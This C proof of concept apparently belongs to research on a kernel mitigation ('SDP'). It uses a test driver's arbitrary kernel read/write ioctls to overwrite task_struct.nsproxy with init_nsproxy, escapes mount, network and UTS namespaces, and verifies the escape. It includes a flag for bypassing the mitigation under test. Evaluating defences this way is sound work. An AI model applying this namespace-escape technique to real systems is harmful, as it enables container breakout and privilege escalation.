// FZY: Add a simple proof of concept that overwrites task_struct.nsproxy to escape namespaces (e.g., mount/network/uts namespaces) by pointing it at init_nsproxy

#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <unistd.h>

struct arb_request {
  unsigned long addr;
  void *data;
  size_t size;
};

#define ARB_READ _IOR('A', 1, struct arb_request)
#define ARB_WRITE _IOW('A', 2, struct arb_request)
#define ARB_GET_CURRENT_TASK _IOR('A', 8, unsigned long)

void arb_read(int fd, unsigned long addr, void *data, size_t size) {
  struct arb_request req = {.addr = addr, .data = data, .size = size};
  if (ioctl(fd, ARB_READ, &req) < 0) {
    perror("arb_read");
    exit(1);
  }
}

int arb_read_try(int fd, unsigned long addr, void *data, size_t size) {
  struct arb_request req = {.addr = addr, .data = data, .size = size};
  return ioctl(fd, ARB_READ, &req);
}

void arb_write(int fd, unsigned long addr, void *data, size_t size) {
  struct arb_request req = {.addr = addr, .data = data, .size = size};
  if (ioctl(fd, ARB_WRITE, &req) < 0) {
    perror("arb_write");
    exit(1);
  }
}

// Read the inode number that /proc/self/ns/<which> points to.
// The link target has the form "mnt:[4026531840]".
static unsigned long read_ns_inode(const char *which) {
  char path[64];
  char target[128];
  snprintf(path, sizeof(path), "/proc/self/ns/%s", which);
  ssize_t n = readlink(path, target, sizeof(target) - 1);
  if (n < 0) {
    perror("readlink");
    return 0;
  }
  target[n] = '\0';
  char *lb = strchr(target, '[');
  char *rb = strchr(target, ']');
  if (!lb || !rb) {
    fprintf(stderr, "Failed to parse ns link: %s\n", target);
    return 0;
  }
  *rb = '\0';
  return strtoul(lb + 1, NULL, 10);
}

// Snapshot of the leading nsproxy fields used for manifestation.
// On RISC-V LP64 with the typical 6.6 layout (count is atomic_t = 4 bytes,
// followed by 4 bytes of padding, then the namespace pointers):
//   +0:  count (4)         +4:  pad (4)
//   +8:  uts_ns             +16: ipc_ns
//   +24: mnt_ns             +32: pid_ns_for_children
//   +40: net_ns             +48: time_ns (CONFIG_TIME_NS)
struct ns_snapshot {
  unsigned int count;
  unsigned int pad;
  unsigned long uts_ns;
  unsigned long ipc_ns;
  unsigned long mnt_ns;
  unsigned long pid_ns_for_children;
  unsigned long net_ns;
};

static void print_snapshot(const char *label, const struct ns_snapshot *s) {
  printf("[+]   %s: count=%u uts=0x%lx ipc=0x%lx mnt=0x%lx pid=0x%lx net=0x%lx\n",
         label, s->count, s->uts_ns, s->ipc_ns, s->mnt_ns,
         s->pid_ns_for_children, s->net_ns);
}

int main(int argc, char *argv[]) {
  printf("[+] task_struct.nsproxy Namespace Escape PoC\n\n");

  if (argc != 4) {
    printf("Usage: %s <mode> <nsproxy_offset> <init_nsproxy_addr>\n", argv[0]);
    printf("  mode: 0 (no protection), 1/2 (SDP protection)\n");
    printf("  nsproxy_offset: offset of nsproxy pointer in task_struct\n");
    printf("                  pahole -C task_struct vmlinux | grep -A1 "
           "'struct nsproxy.*nsproxy'\n");
    printf("  init_nsproxy_addr: kernel address of init_nsproxy symbol\n");
    printf("                     nm vmlinux | grep ' init_nsproxy$'\n");
    return 1;
  }

  // Namespace setup is handled by the wrapper script run_nsproxy_poc.sh,
  // which runs unshare/sethostname as root and execs this PoC inside the
  // new namespace as a regular user. This binary itself never needs root.

  int fd = open("/dev/arb_rw", O_RDWR);
  if (fd < 0) {
    perror("open /dev/arb_rw");
    return 1;
  }
  printf("[+] Opened /dev/arb_rw\n");

  int mode = atoi(argv[1]);
  unsigned long nsproxy_offset = strtoul(argv[2], NULL, 0);
  unsigned long init_nsproxy_addr = strtoul(argv[3], NULL, 0);

  // Sanity check: init_nsproxy must be in the kernel virtual range.
  // RISC-V Sv39/Sv48 kernel addresses have the top bits set; reject anything
  // that obviously is not a kernel pointer so we don't clobber task->nsproxy
  // with garbage and panic the kernel.
  if ((init_nsproxy_addr >> 56) != 0xff) {
    fprintf(stderr,
            "[-] init_nsproxy_addr=0x%lx does not look like a kernel "
            "address (top byte must be 0xff). Refusing to write.\n",
            init_nsproxy_addr);
    close(fd);
    return 1;
  }

  // Step 1: Get current task_struct address
  unsigned long task_addr;
  if (ioctl(fd, ARB_GET_CURRENT_TASK, &task_addr) < 0) {
    perror("ARB_GET_CURRENT_TASK");
    close(fd);
    return 1;
  }
  printf("[+] Current task_struct address: 0x%lx\n", task_addr);

  // FZY: Set to 1 to run the bookkeeping under SDP too, to check the rest of
  // the steps on a non-enforcing build.  An enforcing one panics on the step 2
  // read below.
  const int sdp_bypass = 0;
  const int bookkeeping = (mode == 0) || sdp_bypass;

  // Step 2: Read the nsproxy pointer from task_struct.
  //
  // FZY: bookkeeping only - the attack needs the pointer's address and the
  // value to write, not the old value.  Under SDP this read would trap before
  // the step 5 store, which is the access the attack really depends on.
  unsigned long nsproxy_ptr_addr = task_addr + nsproxy_offset;
  unsigned long orig_nsproxy = 0;
  if (bookkeeping) {
    arb_read(fd, nsproxy_ptr_addr, &orig_nsproxy, sizeof(orig_nsproxy));
    printf("[+] nsproxy pointer at task_struct+%lu: 0x%lx\n", nsproxy_offset,
           orig_nsproxy);
    if (mode != 0) {
      printf("[+] SDP mode %d: nsproxy pointer (tagged): 0x%lx\n", mode,
             orig_nsproxy);
      // FZY: Enable to bypass the mitigation and evaluate if the rest steps work
      // correctly
      orig_nsproxy = orig_nsproxy | 0xFFFF000000000000;
    }
  } else {
    printf("[+] SDP mode %d: not reading task_struct+%lu; the overwrite in "
           "step 5 is the access this attack needs\n",
           mode, nsproxy_offset);
  }

  // Step 3: Sanity-check init_nsproxy by reading its struct contents BEFORE
  // we touch task_struct.  If this fails or the count looks bogus, abort.
  struct ns_snapshot init_snap = {0};
  if (arb_read_try(fd, init_nsproxy_addr, &init_snap, sizeof(init_snap)) < 0) {
    fprintf(stderr,
            "[-] arb_read of init_nsproxy at 0x%lx failed; refusing to write.\n",
            init_nsproxy_addr);
    close(fd);
    return 1;
  }
  if (init_snap.uts_ns == 0 || init_snap.mnt_ns == 0 ||
      (init_snap.uts_ns >> 56) != 0xff || (init_snap.mnt_ns >> 56) != 0xff) {
    fprintf(stderr,
            "[-] init_nsproxy at 0x%lx does not look valid "
            "(uts=0x%lx mnt=0x%lx). Refusing to write.\n",
            init_nsproxy_addr, init_snap.uts_ns, init_snap.mnt_ns);
    close(fd);
    return 1;
  }

  // The task's own nsproxy comes out of an sdp_cache, so this one is protected
  // too; it goes with the step 2 read.
  struct ns_snapshot orig_snap = {0};
  if (bookkeeping)
    arb_read(fd, orig_nsproxy, &orig_snap, sizeof(orig_snap));

  // Step 4: Capture syscall observables in the NEW (unshared) namespace.
  unsigned long mnt_before = read_ns_inode("mnt");
  unsigned long net_before = read_ns_inode("net");
  unsigned long uts_before = read_ns_inode("uts");
  char host_before[256] = {0};
  if (gethostname(host_before, sizeof(host_before) - 1) < 0)
    strcpy(host_before, "(gethostname failed)");
  printf("\n[+] [BEFORE] in unshared ns: mnt=%lu net=%lu uts=%lu hostname='%s'\n",
         mnt_before, net_before, uts_before, host_before);

  // Step 5: Overwrite task->nsproxy with init_nsproxy.  init_nsproxy and
  // its inner namespace pointers were validated above, so syscalls that
  // walk current->nsproxy->... will resolve through init's namespaces
  // instead of faulting.
  printf("\n[+] Overwriting task->nsproxy to init_nsproxy: 0x%lx\n",
         init_nsproxy_addr);
  arb_write(fd, nsproxy_ptr_addr, &init_nsproxy_addr,
            sizeof(init_nsproxy_addr));

  // Step 6: Verify the overwrite via arb_read AND via syscalls that walk
  // current->nsproxy.  Now we should observe init's namespaces.
  unsigned long new_nsproxy;
  arb_read(fd, nsproxy_ptr_addr, &new_nsproxy, sizeof(new_nsproxy));
  printf("[+] task->nsproxy after overwrite (arb_read): 0x%lx\n", new_nsproxy);

  unsigned long mnt_during = read_ns_inode("mnt");
  unsigned long net_during = read_ns_inode("net");
  unsigned long uts_during = read_ns_inode("uts");
  char host_during[256] = {0};
  if (gethostname(host_during, sizeof(host_during) - 1) < 0)
    strcpy(host_during, "(gethostname failed)");
  printf("[+] [DURING] task->nsproxy=init_nsproxy: mnt=%lu net=%lu uts=%lu "
         "hostname='%s'\n",
         mnt_during, net_during, uts_during, host_during);

  // Step 7: Restore original nsproxy pointer to keep the process and
  // kernel stable on exit (so put_nsproxy() decrements the right struct).
  // Without the step 2 read there is no original pointer to put back.
  if (bookkeeping) {
    printf("\n[+] Restoring original task->nsproxy: 0x%lx\n", orig_nsproxy);
    arb_write(fd, nsproxy_ptr_addr, &orig_nsproxy, sizeof(orig_nsproxy));
  } else {
    printf("\n[-] SDP mode %d: the step 5 store was NOT trapped; the original "
           "pointer was never read, so task->nsproxy stays at init_nsproxy\n",
           mode);
  }

  // Step 8: Re-capture syscall observables AFTER the restore to confirm
  // the process is back in its (unshared) namespaces.
  unsigned long mnt_after = read_ns_inode("mnt");
  unsigned long net_after = read_ns_inode("net");
  unsigned long uts_after = read_ns_inode("uts");
  char host_after[256] = {0};
  if (gethostname(host_after, sizeof(host_after) - 1) < 0)
    strcpy(host_after, "(gethostname failed)");
  printf("[+] [AFTER]  restored:                mnt=%lu net=%lu uts=%lu "
         "hostname='%s'\n",
         mnt_after, net_after, uts_after, host_after);

  // === Manifestation ===
  printf("\n[+] === MANIFESTATION ===\n");

  // (a) The pointer in task_struct genuinely flipped to init_nsproxy.
  printf("[+] task->nsproxy pointer:\n");
  if (bookkeeping)
    printf("[+]   original: 0x%lx\n", orig_nsproxy);
  else
    printf("[+]   original: (not read in SDP mode)\n");
  printf("[+]   written : 0x%lx %s\n", new_nsproxy,
         new_nsproxy == init_nsproxy_addr ? "(MATCHES init_nsproxy)" : "(MISMATCH!)");

  // (b) The contents of init_nsproxy differ from the task's original
  // nsproxy.  If we'd held the pointer flipped, every namespace lookup
  // would have resolved through init_nsproxy's namespace pointers
  // instead of the task's, which is the namespace escape.
  printf("[+] nsproxy struct contents (read via arb_read):\n");
  int ns_differ = 0;
  if (bookkeeping) {
    print_snapshot("orig_nsproxy", &orig_snap);
    print_snapshot("init_nsproxy", &init_snap);
    ns_differ = (orig_snap.uts_ns != init_snap.uts_ns) ||
                (orig_snap.ipc_ns != init_snap.ipc_ns) ||
                (orig_snap.mnt_ns != init_snap.mnt_ns) ||
                (orig_snap.net_ns != init_snap.net_ns) ||
                (orig_snap.pid_ns_for_children !=
                 init_snap.pid_ns_for_children);
    printf("[+]   namespace pointers differ: %s\n",
           ns_differ ? "YES (escape would have switched namespaces)"
                     : "no (already running in init's namespaces)");
  } else {
    print_snapshot("init_nsproxy", &init_snap);
    printf("[+]   orig_nsproxy: (not read in SDP mode)\n");
  }

  // (c) Syscall view across the three checkpoints: BEFORE (in our
  // unshared ns) -> DURING (with task->nsproxy = init_nsproxy) ->
  // AFTER (restored).
  printf("[+] Syscall view BEFORE -> DURING -> AFTER:\n");
  printf("[+]   mnt:      %lu -> %lu -> %lu  %s\n", mnt_before, mnt_during,
         mnt_after,
         mnt_before != mnt_during ? "(ESCAPED)" : "(no change)");
  printf("[+]   net:      %lu -> %lu -> %lu  %s\n", net_before, net_during,
         net_after,
         net_before != net_during ? "(ESCAPED)" : "(no change)");
  printf("[+]   uts:      %lu -> %lu -> %lu  %s\n", uts_before, uts_during,
         uts_after,
         uts_before != uts_during ? "(ESCAPED)" : "(no change)");
  printf("[+]   hostname: '%s' -> '%s' -> '%s'  %s\n", host_before,
         host_during, host_after,
         strcmp(host_before, host_during) ? "(ESCAPED)" : "(no change)");
  printf("[+]   restore : mnt=%s net=%s uts=%s host=%s\n",
         mnt_before == mnt_after ? "OK" : "MISMATCH",
         net_before == net_after ? "OK" : "MISMATCH",
         uts_before == uts_after ? "OK" : "MISMATCH",
         strcmp(host_before, host_after) == 0 ? "OK" : "MISMATCH");

  int escaped = (mnt_before != mnt_during) || (net_before != net_during) ||
                (uts_before != uts_during) ||
                strcmp(host_before, host_during) != 0;

  if (new_nsproxy == init_nsproxy_addr && escaped)
    printf("\n[+] SUCCESS: task_struct.nsproxy was redirected to init_nsproxy "
           "and the\n[+] task's syscall view of mnt/uts/net namespaces "
           "switched to init's view\n[+] (and reverted on restore).\n");
  else if (new_nsproxy == init_nsproxy_addr && ns_differ)
    printf("\n[+] Pointer flipped and namespaces differ in struct, but no "
           "syscall-level\n[+] difference observed. Are we already in init's "
           "namespaces?\n");
  else if (new_nsproxy != init_nsproxy_addr)
    printf("\n[-] task->nsproxy was NOT updated as expected.\n");
  else
    printf("\n[+] Pointer flipped, task is already running in init's "
           "namespaces.\n");

  close(fd);
  return 0;
}
